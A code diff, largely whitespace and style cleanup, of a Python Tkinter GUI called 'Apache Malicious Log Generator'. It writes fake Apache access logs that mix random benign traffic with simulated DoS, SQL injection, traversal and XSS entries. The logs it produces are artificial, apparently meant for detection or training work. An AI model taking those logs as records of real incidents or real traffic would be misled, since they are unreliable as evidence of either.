@@ -8,10 +8,9 @@ from faker import Faker
 import logging
 import time
 import os
+
 agent = UserAgent()
 fake = Faker()
-
-
 
 attfreq = 0
 randate = None
@@ -29,24 +28,23 @@ dal = 0
 lownslow = False
 ddos = True
 GETFlood = False
-attacks=[]
-randomdate=True
+attacks = []
+randomdate = True
 randomtime = True
-custnote=False
+custnote = False
 trafcyc = 500
 loristime = 60
 packonce = 10
 
-#----------------------------Creates Log Folder if doesn't exist-------------------------------#
+# ----------------------------Creates Log Folder if doesn't exist-------------------------------#
 if not os.path.exists("Logs"):
     os.makedirs("Logs")
 
 
-#----------------------------Gui Menu-------------------------------#
+# ----------------------------Gui Menu-------------------------------#
 def Apache():
-
-    global freq, ent, whtraf, traffic, var1, var2, var3, var4, var5, var6,txt, dal
-    pack=0
+    global freq, ent, whtraf, traffic, var1, var2, var3, var4, var5, var6, txt, dal
+    pack = 0
 
     apa = Tk()
     apa.title("Apache Malicious Log Generator")
@@ -54,10 +52,10 @@ def Apache():
     apa.geometry("500x400+500+100")
 
     head = Label(apa, text="Apache Malicious Log Generator", font="Times 20 bold")
-    head.place(x=50,y=50)
+    head.place(x=50, y=50)
 
     entlab = Label(apa, text="Amount of Packets")
-    ent = Entry(apa, bd = 1)
+    ent = Entry(apa, bd=1)
     entlab.place(x=50, y=125)
     ent.place(x=50, y=150)
 
@@ -69,63 +67,78 @@ def Apache():
             dal -= 1
 
     whtraf = IntVar()
-    traffic = Checkbutton(apa, text="White Traffic", onvalue=1, offvalue=0, command=lambda:dalby())
+    traffic = Checkbutton(apa, text="White Traffic", onvalue=1, offvalue=0, command=lambda: dalby())
     traffic.place(x=50, y=280)
-
-
 
     freq = StringVar(apa)
     freq.set("None")
 
-    optionz = OptionMenu(apa, freq, "Very Frequent","Common", "Less Common" ,"Rare")
+    optionz = OptionMenu(apa, freq, "Very Frequent", "Common", "Less Common", "Rare")
     attack5 = Label(apa, text="Attack Frequency")
     attack5.place(x=50, y=175)
     optionz.place(x=50, y=195)
 
     var1 = StringVar(apa)
     var1.set("None")
-    opt = OptionMenu(apa, var1, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
+    opt = OptionMenu(apa, var1, "None", "---DoS---", "Slowloris", "R-U-Dead-Yet", "HTTP POST Flood(DoS)",
+                     "HTTP GET Flood(DoS)", "---DDoS---", "HTTP POST Flood(DDoS)", "HTTP GET Flood(DDoS)",
+                     "---Application Side Attacks---", "SQL Injection", "Directory Traversal Attack",
+                     "Cross-Site Scripting(XSS)")
     attack1 = Label(apa, text="First Attack")
     attack1.place(x=250, y=135)
     opt.place(x=350, y=130)
 
     var2 = StringVar(apa)
     var2.set("None")
-    opt2 = OptionMenu(apa, var2, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
+    opt2 = OptionMenu(apa, var2, "None", "---DoS---", "Slowloris", "R-U-Dead-Yet", "HTTP POST Flood(DoS)",
+                      "HTTP GET Flood(DoS)", "---DDoS---", "HTTP POST Flood(DDoS)", "HTTP GET Flood(DDoS)",
+                      "---Application Side Attacks---", "SQL Injection", "Directory Traversal Attack",
+                      "Cross-Site Scripting(XSS)")
     attack2 = Label(apa, text="Second Attack")
     attack2.place(x=250, y=165)
     opt2.place(x=350, y=160)
 
     var3 = StringVar(apa)
     var3.set("None")
-    opt3 = OptionMenu(apa, var3, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
+    opt3 = OptionMenu(apa, var3, "None", "---DoS---", "Slowloris", "R-U-Dead-Yet", "HTTP POST Flood(DoS)",
+                      "HTTP GET Flood(DoS)", "---DDoS---", "HTTP POST Flood(DDoS)", "HTTP GET Flood(DDoS)",
+                      "---Application Side Attacks---", "SQL Injection", "Directory Traversal Attack",
+                      "Cross-Site Scripting(XSS)")
     attack3 = Label(apa, text="Third Attack")
     attack3.place(x=250, y=195)
     opt3.place(x=350, y=190)
 
     var4 = StringVar(apa)
     var4.set("None")
-    opt4 = OptionMenu(apa, var4, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
+    opt4 = OptionMenu(apa, var4, "None", "---DoS---", "Slowloris", "R-U-Dead-Yet", "HTTP POST Flood(DoS)",
+                      "HTTP GET Flood(DoS)", "---DDoS---", "HTTP POST Flood(DDoS)", "HTTP GET Flood(DDoS)",
+                      "---Application Side Attacks---", "SQL Injection", "Directory Traversal Attack",
+                      "Cross-Site Scripting(XSS)")
     attack4 = Label(apa, text="Fourth Attack")
     attack4.place(x=250, y=225)
     opt4.place(x=350, y=220)
 
     var5 = StringVar(apa)
     var5.set("None")
-    opt5 = OptionMenu(apa, var5, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
+    opt5 = OptionMenu(apa, var5, "None", "---DoS---", "Slowloris", "R-U-Dead-Yet", "HTTP POST Flood(DoS)",
+                      "HTTP GET Flood(DoS)", "---DDoS---", "HTTP POST Flood(DDoS)", "HTTP GET Flood(DDoS)",
+                      "---Application Side Attacks---", "SQL Injection", "Directory Traversal Attack",
+                      "Cross-Site Scripting(XSS)")
     attack5 = Label(apa, text="Fifth Attack")
     attack5.place(x=250, y=255)
     opt5.place(x=350, y=250)
 
     var6 = StringVar(apa)
     var6.set("None")
-    opt6 = OptionMenu(apa, var6, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
+    opt6 = OptionMenu(apa, var6, "None", "---DoS---", "Slowloris", "R-U-Dead-Yet", "HTTP POST Flood(DoS)",
+                      "HTTP GET Flood(DoS)", "---DDoS---", "HTTP POST Flood(DDoS)", "HTTP GET Flood(DDoS)",
+                      "---Application Side Attacks---", "SQL Injection", "Directory Traversal Attack",
+                      "Cross-Site Scripting(XSS)")
     attack6 = Label(apa, text="Sixth Attack")
     attack6.place(x=250, y=285)
     opt6.place(x=350, y=280)
 
-
-                    #---Buttons---#
+    # ---Buttons---#
 
     enter = Button(apa, text="Enter", command=lambda: starterrors())
     enter.place(x=220, y=367)
@@ -133,20 +146,20 @@ def Apache():
     openfolder = Button(apa, text="Open Log Folder", command=lambda: os.startfile("Logs"))
     openfolder.place(x=320, y=367)
 
-    other = Button(apa, text="Other Options", command=lambda:OtherOps())
+    other = Button(apa, text="Other Options", command=lambda: OtherOps())
     other.place(x=60, y=367)
-
-
 
     txt = Text(apa, width=47, height=3)
     txt.config(state=DISABLED)
     txt.place(x=50, y=312)
 
     apa.mainloop()
-#----------------------------More Options Menu--------------------------------#
+
+
+# ----------------------------More Options Menu--------------------------------#
 
 def OtherOps():
-    global day,month,year, randomdate, randomtime, randate, hour, min, sec, ms, cfr, trafcyc, attfreq, tim, loristime, packonce, ptim
+    global day, month, year, randomdate, randomtime, randate, hour, min, sec, ms, cfr, trafcyc, attfreq, tim, loristime, packonce, ptim
 
     alt = Tk()
 
@@ -156,7 +169,6 @@ def OtherOps():
     month.set("Month")
     year = StringVar(alt)
     year.set("Year")
-
 
     hr = StringVar(alt)
     hr.set("Hour")
@@ -171,26 +183,36 @@ def OtherOps():
 
     LowText = Label(alt, text="Custom Start Date/Time")
     LowText.place(x=30, y=20)
-    d = OptionMenu(alt,day,"Day","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31")
+    d = OptionMenu(alt, day, "Day", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15",
+                   "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31")
     d.place(x=30, y=40)
 
-    m = OptionMenu(alt, month,"Month" ,"Jan","Feb","Mar","Apr","May","Jun","July","Aug","Sept","Oct","Nov","Dec")
+    m = OptionMenu(alt, month, "Month", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "July", "Aug", "Sept", "Oct", "Nov",
+                   "Dec")
     m.place(x=30, y=70)
 
-    y = OptionMenu(alt, year,"Year", "2010","2011","2012","2013","2014","2015","2016","2017","2018","2019","2020")
+    y = OptionMenu(alt, year, "Year", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018", "2019",
+                   "2020")
     y.place(x=30, y=100)
 
-    hourtim = OptionMenu(alt,hr,"Hour","0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23")
+    hourtim = OptionMenu(alt, hr, "Hour", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
+                         "14", "15", "16", "17", "18", "19", "20", "21", "22", "23")
     hourtim.place(x=120, y=40)
 
-    mintim = OptionMenu(alt, mn,"Minute","0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59")
+    mintim = OptionMenu(alt, mn, "Minute", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
+                        "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29",
+                        "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45",
+                        "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59")
     mintim.place(x=120, y=70)
 
-    sectim = OptionMenu(alt, sc,"Second", "0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59")
+    sectim = OptionMenu(alt, sc, "Second", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
+                        "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29",
+                        "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45",
+                        "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59")
     sectim.place(x=120, y=100)
 
     custfreq = Label(alt, text="Custom Frequency")
-    cfre=Entry(alt, bd = 1)
+    cfre = Entry(alt, bd=1)
     custfreq.place(x=60, y=160)
     cfre.place(x=55, y=185)
 
@@ -198,21 +220,20 @@ def OtherOps():
     DosText.place(x=217, y=20)
 
     alttime = Label(alt, text="Traffic per cycle (Default = 500)")
-    tim = Entry(alt, bd = 1)
+    tim = Entry(alt, bd=1)
     alttime.place(x=217, y=45)
     tim.place(x=227, y=70)
 
     LowText = Label(alt, text="Slowloris/R.U.D.Y Options")
     LowText.place(x=217, y=175)
 
-
     alttime = Label(alt, text="Time between Packet burst in Sec\n(Default = 60s)")
-    tim2 = Entry(alt, bd = 1)
+    tim2 = Entry(alt, bd=1)
     alttime.place(x=202, y=205)
     tim2.place(x=227, y=240)
 
     alt2time = Label(alt, text="Packets at once\n(Default = 10)")
-    ptim = Entry(alt, bd = 1)
+    ptim = Entry(alt, bd=1)
     alt2time.place(x=247, y=95)
     ptim.place(x=227, y=130)
 
@@ -222,9 +243,8 @@ def OtherOps():
     clear.place(x=60, y=240)
     cancel = Button(alt, text="Cancel Settings", command=lambda: alt.destroy())
     cancel.place(x=60, y=270)
-    rand= Button(alt, text="Random Date/Time", command=lambda: rand())
+    rand = Button(alt, text="Random Date/Time", command=lambda: rand())
     rand.place(x=55, y=135)
-
 
     def restore():
         global trafcyc, loristime, packonce
@@ -239,13 +259,13 @@ def OtherOps():
         ptim.delete(0, END)
         cfre.delete(0, END)
         trafcyc = 500
-        loristime= 60
+        loristime = 60
         packonce = 10
         rand()
+
     def confirm():
 
-
-        global day, month,year,randomdate, randomtime, randate, text, hour, min, sec, ms, cfr, trafcyc, attfreq, tim, loristime, packonce, freq, custnote
+        global day, month, year, randomdate, randomtime, randate, text, hour, min, sec, ms, cfr, trafcyc, attfreq, tim, loristime, packonce, freq, custnote
 
         days = day.get()
         monthz = month.get()
@@ -254,18 +274,17 @@ def OtherOps():
         hour = hr.get()
         min = mn.get()
         sec = sc.get()
-        cyc =tim.get()
+        cyc = tim.get()
         custfr = cfre.get()
         timebet = tim2.get()
         atonce = ptim.get()
-
 
         if cyc != "":
             try:
                 cfr = int(cyc)
             except ValueError:
-                    text ="Error: Invalid Entry"
-                    txtbox()
+                text = "Error: Invalid Entry"
+                txtbox()
         else:
             cyc = 0
         if custfr != "":
@@ -273,18 +292,18 @@ def OtherOps():
                 custfreq = int(custfr)
                 custnote = True
             except ValueError:
-                    text ="Error: Invalid Entry"
-                    freq.set("None")
-                    custfreq=0
-                    txtbox()
+                text = "Error: Invalid Entry"
+                freq.set("None")
+                custfreq = 0
+                txtbox()
         else:
             custfreq = 0
         if timebet != "":
             try:
                 timebet = int(timebet)
             except ValueError:
-                    text ="Error: Invalid Entry"
-                    txtbox()
+                text = "Error: Invalid Entry"
+                txtbox()
         else:
             timebet = 0
 
@@ -292,11 +311,11 @@ def OtherOps():
             try:
                 atonce = int(atonce)
             except ValueError:
-                    text ="Error: Invalid Entry\nPlease enter valid entry"
-                    txtbox()
+                text = "Error: Invalid Entry\nPlease enter valid entry"
+                txtbox()
         else:
             atonce = 0
-        
+
         if days == "Day" and monthz == "Month" and years == "Year":
             randomdate = True
         else:
@@ -327,34 +346,33 @@ def OtherOps():
                 months = 12
 
             if days == str("Day"):
-                days = random.randint(1,31)
+                days = random.randint(1, 31)
             if monthz == str("Month"):
-                months = random.randint(1,12)
+                months = random.randint(1, 12)
             if years == str("Year"):
-                years = random.randint(2010,2020)
+                years = random.randint(2010, 2020)
             randomdate = False
             try:
-                randate= datetime.date(int(years), months, int(days))
-                text ="set Date:" + days+"/" +str(months)+"/"+years
+                randate = datetime.date(int(years), months, int(days))
+                text = "set Date:" + days + "/" + str(months) + "/" + years
             except ValueError:
-                text ="Error: Invalid Date\nPlease enter valid date"
+                text = "Error: Invalid Date\nPlease enter valid date"
                 txtbox()
                 randomdate = True
-
 
             if hour == "Hour" and min == "Minute" and sec == "Second":
                 randomtime = True
             else:
                 if hour == str("Hour"):
-                    hour = random.randint(0,23)
+                    hour = random.randint(0, 23)
                 if min == str("Minute"):
-                    min = random.randint(0,59)
+                    min = random.randint(0, 59)
                 if sec == str("Second"):
-                    sec = random.randint(0,59)
+                    sec = random.randint(0, 59)
                 hour = int(hour)
                 min = int(min)
                 sec = int(sec)
-                ms = random.randint(000000,900000)
+                ms = random.randint(000000, 900000)
                 randomtime = False
 
         if cyc != 0:
@@ -371,14 +389,7 @@ def OtherOps():
 
         if custnote == True:
             freq.set("Custom")
-            custnote=False
-
-
-
-
-
-
-
+            custnote = False
 
         alt.destroy()
 
@@ -387,94 +398,83 @@ def OtherOps():
         randomtime = True
         randomdate = True
 
-
-
-
-
-
-
-
-
     alt.mainloop()
 
 
-#----------------------------Traffic Generation--------------------------------#
-#Frequency of attacks on system
+# ----------------------------Traffic Generation--------------------------------#
+# Frequency of attacks on system
 def start():
-
-    global pack, whtraf, name, choice, amount,traf, dal,text
-    num=time.strftime('%d%m%H%M%S')
-    text ="Generating Logs..."
+    global pack, whtraf, name, choice, amount, traf, dal, text
+    num = time.strftime('%d%m%H%M%S')
+    text = "Generating Logs..."
     txtbox()
-    name=('Logs/ApacheLog.'+str(num)+'.log')
-    pack=ent.get()
-    amount =int(pack)
+    name = ('Logs/ApacheLog.' + str(num) + '.log')
+    pack = ent.get()
+    amount = int(pack)
     datime()
 
     if dal == 1:
 
         fr()
         whitetraffic()
-        text ="Logs Generated W/ Traffic"
+        text = "Logs Generated W/ Traffic"
         txtbox()
-        traf=1
+        traf = 1
     elif dal == 0:
         fr()
         mulatt()
-        text ="Logs Generated W/O Traffic"
+        text = "Logs Generated W/O Traffic"
         txtbox()
-        traf=1
+        traf = 1
 
-#---------------------Error Section-------------------=
+
+# ---------------------Error Section-------------------=
 def starterrors():
     global text
-    pack=ent.get()
+    pack = ent.get()
 
     att = var1.get()
-    att2= var2.get()
-    att3= var3.get()
-    att4= var4.get()
-    att5= var5.get()
-    att6= var6.get()
+    att2 = var2.get()
+    att3 = var3.get()
+    att4 = var4.get()
+    att5 = var5.get()
+    att6 = var6.get()
 
     if pack == '':
-        text ="Error: Packet amount left empty\nPlease enter an amount"
+        text = "Error: Packet amount left empty\nPlease enter an amount"
         txtbox()
     elif dal == 0 and att == "None" and att2 == "None" and att3 == "None" and att4 == "None" and att5 == "None" and att6 == "None":
-        text ="Error: fields left empty\nPlease make selections"
+        text = "Error: fields left empty\nPlease make selections"
         txtbox()
-    elif pack.isnumeric()!= True:
-        text ="Error: Amount is not a valid number\nPlease enter a number"
+    elif pack.isnumeric() != True:
+        text = "Error: Amount is not a valid number\nPlease enter a number"
         txtbox()
-    elif att ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
-        text ="Error: Header is not a valid selection\nPlease try again"
+    elif att == "---DoS---" or att == "---DDoS---" or att == "---Application Side Attacks---":
+        text = "Error: Header is not a valid selection\nPlease try again"
         txtbox()
-    elif att2 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
-        text ="Error: Header is not a valid selection\nPlease try again"
+    elif att2 == "---DoS---" or att == "---DDoS---" or att == "---Application Side Attacks---":
+        text = "Error: Header is not a valid selection\nPlease try again"
         txtbox()
-    elif att3 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
-        text ="Error: Header is not a valid selection\nPlease try again"
+    elif att3 == "---DoS---" or att == "---DDoS---" or att == "---Application Side Attacks---":
+        text = "Error: Header is not a valid selection\nPlease try again"
         txtbox()
-    elif att4 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
-        text ="Error: Header is not a valid selection\nPlease try again"
+    elif att4 == "---DoS---" or att == "---DDoS---" or att == "---Application Side Attacks---":
+        text = "Error: Header is not a valid selection\nPlease try again"
         txtbox()
-    elif att5 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
-        text ="Error: Header is not a valid selection\nPlease try again"
+    elif att5 == "---DoS---" or att == "---DDoS---" or att == "---Application Side Attacks---":
+        text = "Error: Header is not a valid selection\nPlease try again"
         txtbox()
-    elif att6 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
-        text ="Error: Header is not a valid selection\nPlease try again"
+    elif att6 == "---DoS---" or att == "---DDoS---" or att == "---Application Side Attacks---":
+        text = "Error: Header is not a valid selection\nPlease try again"
         txtbox()
     else:
         start()
 
 
-
-
-
-#Frequency of attacks on system
+# Frequency of attacks on system
 def fr():
     global attfreq, dal
-    op= freq.get()
+    op = freq.get()
 
     if op == "Very Frequent":
         attfreq = 25
@@ -491,7 +491,7 @@ def fr():
             attfreq = 0
 
 
-#Time stamp for server
+# Time stamp for server
 def datime():
     global randate, hour, min, sec, ms
     if randomdate == True:
@@ -503,26 +503,26 @@ def datime():
         randate = stdate + datetime.timedelta(days=randays)
 
     if randomtime == True:
-        #generate time
-        hour = random.randint(00,23)
-        min = random.randint(00,59)
-        sec = random.randint(00,59)
-        ms = random.randint(000000,900000)
+        # generate time
+        hour = random.randint(00, 23)
+        min = random.randint(00, 59)
+        sec = random.randint(00, 59)
+        ms = random.randint(000000, 900000)
 
 
-#Random white traffic to add to realism
+# Random white traffic to add to realism
 def whitetraffic():
-    global randate, hour, min, sec, ms, ts, name, traf, mysite,  saved, attfreq
-    respans=0
+    global randate, hour, min, sec, ms, ts, name, traf, mysite, saved, attfreq
+    respans = 0
     noget = 0
-    n=time.localtime()
-    t=0
+    n = time.localtime()
+    t = 0
     att = var1.get()
-    att2= var2.get()
-    att3= var3.get()
-    att4= var4.get()
-    att5= var5.get()
-    att6= var6.get()
+    att2 = var2.get()
+    att3 = var3.get()
+    att4 = var4.get()
+    att5 = var5.get()
+    att6 = var6.get()
 
     while traf <= amount:
         def srcip():
@@ -530,63 +530,69 @@ def whitetraffic():
             bits = getrandbits(32)
             addr = IPv4Address(bits)
             src = str(addr)
+
         srcip()
         ag = agent.random
-        noget= random.randint(1,500)
+        noget = random.randint(1, 500)
         if noget == 2:
-            action = ("POST","PUT","DELETE")
-            msg=random.choice(action)
+            action = ("POST", "PUT", "DELETE")
+            msg = random.choice(action)
         else:
             msg = "GET"
-        respans = random.randint(1,6)
+        respans = random.randint(1, 6)
         if respans == 5:
-            response=["404","500","301"]
+            response = ["404", "500", "301"]
         else:
             response = ["200"]
-        resp=random.choice(response)
-        srcport = random.randint(0,65535)
+        resp = random.choice(response)
+        srcport = random.randint(0, 65535)
         desport = 80
-        size=random.randint(0,100000)
-        dt =datetime.time(hour=hour, minute=min, second=sec)
+        size = random.randint(0, 100000)
+        dt = datetime.time(hour=hour, minute=min, second=sec)
         st = datetime.datetime.combine(randate, dt)
         ts = st.strftime('%d/%b/%Y:%H:%M:%S')
         logging.basicConfig(level=logging.INFO, format='%(message)s')
         logger = logging.getLogger()
         logger.addHandler(logging.FileHandler(name, 'a'))
-        id=random.randint(0,2000)
-        direct=("about","?search=","?search="+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
-        dircho= random.choice(direct)
-        direct2=("/about","/search","/?search="+fake.word(),"/login","/profile/"+fake.user_name(),"/sitemap","/blog","/blog/"+fake.word(),"/messages","/merch","/contact-us","/.robots.txt")
-        dircho2= random.choice(direct2)
-        logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho2,resp,size,mysite,dircho,ag))
-        rand=random.randint(1,60)
-        sec+=rand
-        if sec>= 60:
-            min+=1
-            sec-=60
-        if min>=60:
-            hour+=1
-            min=0
-        if hour>=24:
+        id = random.randint(0, 2000)
+        direct = (
+        "about", "?search=", "?search=" + fake.word(), "login", "profile/" + fake.user_name(), "sitemap", "blog",
+        "blog/" + fake.word(), "messages", "merch", "contact-us", ".robots.txt", "")
+        dircho = random.choice(direct)
+        direct2 = (
+        "/about", "/search", "/?search=" + fake.word(), "/login", "/profile/" + fake.user_name(), "/sitemap", "/blog",
+        "/blog/" + fake.word(), "/messages", "/merch", "/contact-us", "/.robots.txt")
+        dircho2 = random.choice(direct2)
+        logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (
+        src, ts, msg, dircho2, resp, size, mysite, dircho, ag))
+        rand = random.randint(1, 60)
+        sec += rand
+        if sec >= 60:
+            min += 1
+            sec -= 60
+        if min >= 60:
+            hour += 1
+            min = 0
+        if hour >= 24:
             randate = randate + datetime.timedelta(days=1)
-            hour=0
+            hour = 0
         logger.handlers.clear()
-        traf+=1
-        m=0
+        traf += 1
+        m = 0
 
         if att != 0 or att2 != 0 or att3 != 0 or att4 != 0 or att5 != 0 or att6 != 0:
             mulatt()
 
 
-#----------------------------Attack Selection-------------------------------
+# ----------------------------Attack Selection-------------------------------
 def mulatt():
-    global launch1,launch2,launch3,launch4, launch5, launch6, ddos, GETFlood, text, lownslow
+    global launch1, launch2, launch3, launch4, launch5, launch6, ddos, GETFlood, text, lownslow
     att = var1.get()
-    att2= var2.get()
-    att3= var3.get()
-    att4= var4.get()
-    att5= var5.get()
-    att6= var6.get()
+    att2 = var2.get()
+    att3 = var3.get()
+    att4 = var4.get()
+    att5 = var5.get()
+    att6 = var6.get()
 
     if att == "None":
         launch1 = 0
@@ -613,10 +619,6 @@ def mulatt():
     elif att == "HTTP GET Flood(DDoS)":
         launch1 = 9
 
-
-
-
-
     if att2 == "None":
         launch2 = 0
     elif att2 == "Slowloris":
@@ -641,8 +643,6 @@ def mulatt():
         dosip()
     elif att2 == "HTTP GET Flood(DDoS)":
         launch2 = 9
-
-
 
     if att3 == "None":
         launch3 = 0
@@ -669,9 +669,6 @@ def mulatt():
     elif att3 == "HTTP GET Flood(DDoS)":
         launch3 = 9
 
-
-
-
     if att4 == "None":
         launch4 = 0
     elif att4 == "Slowloris":
@@ -696,8 +693,6 @@ def mulatt():
         dosip()
     elif att4 == "HTTP GET Flood(DDoS)":
         launch4 = 9
-
-
 
     if att5 == "None":
         launch5 = 0
@@ -724,7 +719,6 @@ def mulatt():
     elif att5 == "HTTP GET Flood(DDoS)":
         launch5 = 9
 
-
     if att6 == "None":
         launch6 = 0
     elif att6 == "Slowloris":
@@ -750,18 +744,13 @@ def mulatt():
     elif att6 == "HTTP GET Flood(DDoS)":
         launch6 = 9
 
-
-
-
-
-
     def mulattlaunch():
-        global launch1,launch2,launch3,launch4, launch5, launch6, ddos, GETFlood, lownslow,dal
-        listed = [launch1,launch2,launch3,launch4, launch5, launch6]
+        global launch1, launch2, launch3, launch4, launch5, launch6, ddos, GETFlood, lownslow, dal
+        listed = [launch1, launch2, launch3, launch4, launch5, launch6]
         while 0 in listed:
             listed.remove(0)
 
-        att=random.choice(listed)
+        att = random.choice(listed)
         if att == 1:
             lownslow = False
             slowloris()
@@ -800,15 +789,12 @@ def mulatt():
             mulattlaunch()
 
     if launch1 != 0 or launch2 != 0 or launch3 != 0 or launch4 != 0 or launch5 != 0 or launch6 != 0:
-        attackspring = random.randint(1,attfreq)
+        attackspring = random.randint(1, attfreq)
         if attackspring == 1:
             mulattlaunch()
 
 
-
-
-
-#----------------------------Extra Bits of Traffic-------------------------------
+# ----------------------------Extra Bits of Traffic-------------------------------
 
 def dosip():
     global dsrc, ag
@@ -818,13 +804,8 @@ def dosip():
     ag = agent.random
 
 
-
-
-
-
-
 def insidedosatt():
-    listed = [launch1,launch2,launch3,launch4]
+    listed = [launch1, launch2, launch3, launch4]
     while 0 in listed:
         listed.remove(0)
     while 1 in listed:
@@ -833,7 +814,7 @@ def insidedosatt():
         listed.remove(2)
 
     if len(listed) != 0:
-        insatt=random.choice(listed)
+        insatt = random.choice(listed)
         if insatt == 3:
             sqlattack()
         elif insatt == 4:
@@ -842,11 +823,10 @@ def insidedosatt():
             xss()
 
 
-
 def onewhite():
-    global randate, hour, min, sec, ms, ts, name, traf, mysite,  saved, attfreq
-    n=time.localtime()
-    t=0
+    global randate, hour, min, sec, ms, ts, name, traf, mysite, saved, attfreq
+    n = time.localtime()
+    t = 0
     respans = 0
     noget = 0
 
@@ -855,154 +835,146 @@ def onewhite():
         bits = getrandbits(32)
         addr = IPv4Address(bits)
         src = str(addr)
+
     srcip()
     ag = agent.random
-    noget= random.randint(1,6)
+    noget = random.randint(1, 6)
     if respans == 5:
-        action = ("POST","PUT","DELETE")
-        msg=random.choice(action)
+        action = ("POST", "PUT", "DELETE")
+        msg = random.choice(action)
     else:
         msg = "GET"
 
-    respans = random.randint(1,2000)
+    respans = random.randint(1, 2000)
     if respans == 5:
-        response=["404","500","301"]
+        response = ["404", "500", "301"]
     else:
         response = ["200"]
-    resp=random.choice(response)
+    resp = random.choice(response)
 
-    srcport = random.randint(0,65535)
+    srcport = random.randint(0, 65535)
     desport = 80
-    size=random.randint(0,10000)
+    size = random.randint(0, 10000)
 
-    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
+    dt = datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
     st = datetime.datetime.combine(randate, dt)
     ts = st.strftime('%d/%b/%Y:%H:%M:%S')
     logging.basicConfig(level=logging.INFO, format='%(message)s')
     logger = logging.getLogger()
     logger.addHandler(logging.FileHandler(name, 'a'))
-    id=random.randint(0,2000)
-    direct=("about","search","?search="+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
-    dircho= random.choice(direct)
-    direct2=("/about","/search","/?search="+fake.word(),"/login","/profile/"+fake.user_name(),"/sitemap","/blog","/blog/"+fake.word(),"/messages","/merch","/contact-us","/.robots.txt")
-    dircho2= random.choice(direct2)
-    logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho2,resp,size,mysite,dircho,ag))
-    if sec>= 60:
-        min+=1
-        sec-=60
-    if min>=60:
-        hour+=1
-        min=0
-    if hour>=24:
-       randate = randate + datetime.timedelta(days=1)
-       hour=0
+    id = random.randint(0, 2000)
+    direct = ("about", "search", "?search=" + fake.word(), "login", "profile/" + fake.user_name(), "sitemap", "blog",
+              "blog/" + fake.word(), "messages", "merch", "contact-us", ".robots.txt", "")
+    dircho = random.choice(direct)
+    direct2 = (
+    "/about", "/search", "/?search=" + fake.word(), "/login", "/profile/" + fake.user_name(), "/sitemap", "/blog",
